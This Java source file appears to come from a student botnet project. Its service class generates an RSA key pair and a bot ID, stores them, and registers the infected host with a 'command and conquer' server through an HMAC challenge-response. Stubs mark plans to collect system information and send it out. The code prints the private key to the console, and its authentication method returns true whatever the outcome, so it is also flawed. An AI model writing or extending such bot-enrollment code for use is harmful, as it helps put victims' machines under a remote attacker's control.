package cs.sii.bot.passive;

import java.io.IOException;
import java.security.NoSuchAlgorithmException;
import java.security.NoSuchProviderException;
import java.util.ArrayList;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

import cs.sii.bot.active.CryptoAuth;
import cs.sii.bot.active.CryptoPKI;
import cs.sii.config.bot.Engine;
import cs.sii.domain.FileUtil;
import cs.sii.domain.Pairs;
import cs.sii.service.connection.AsyncRequest;
import cs.sii.service.connection.NetworkService;

@Service
public class BotInitialize {

	@Autowired
	private Engine engineBot;

	@Autowired
	private NetworkService networkService;

	@Autowired
	private AsyncRequest request;

	@Autowired
	private CryptoAuth auth;

	@Autowired
	private CryptoPKI pki;

	@Autowired
	private FileUtil fileUtil;

	public BotInitialize() {
	}

	public void initializeBot() throws IOException, NoSuchAlgorithmException, NoSuchProviderException {

		ArrayList<String> param = new ArrayList<String>();
		param = fileUtil.decodeFromFile();

		if (param.size() > 0) {
			String idBot = param.get(0);
			System.out.println("pubK " + param.get(1));
			System.out.println("pivK " + param.get(2));

		} else {
			pki.generateKeyRSA();
			ArrayList<Object> data = new ArrayList<Object>();
			data.add(networkService.generateID());
			data.add(pki.getPubRSAKey());
			data.add(pki.getPrivRSAKey());
			fileUtil.encodeToFile(data);
		}

		if (!engineBot.isCommandandconquerStatus()) {

			// metter controllo ID se ==NULL genera altrimenti riusa
			// TODO salvare ID su properties

			// inserire id univoco nella richiesta
			networkService.firstConnectToMockServerDns();
			// reinserire id univoco nella richiesta
			if (challengeToCommandConquer()) {
				// push info online os
				System.out.println("Bot is Ready");
			} else
				System.out.println("Bot not Ready, authentication failed");
		}
	}

	public void getInfo() {

		// TODO prendi info sistema

		// TODO pusha online info

	}

	private boolean challengeToCommandConquer() {
		//
		System.out.println(networkService.getCommandConquerIps().getIPList().get(0));

		Pairs<Long, Integer> challenge = request.getChallengeFromCommandAndConquer(engineBot.getIdBot(),
				networkService.getCommandConquerIps().getIPList().get(0));

		if (challenge != null) {

			String key = auth.generateStringKey(challenge.getValue2());
			String hashMac = auth.generateHmac(challenge.getValue1(), auth.generateSecretKey(key));
			System.out.println(hashMac);
			String response = request.getResponseFromCommandAndConquer(engineBot.getIdBot(), networkService.getMac(),
					networkService.getCommandConquerIps().getIPList().get(0), hashMac);
			System.out.println("La risposta del CeC: " + response);

		}

		return true;
	}

}
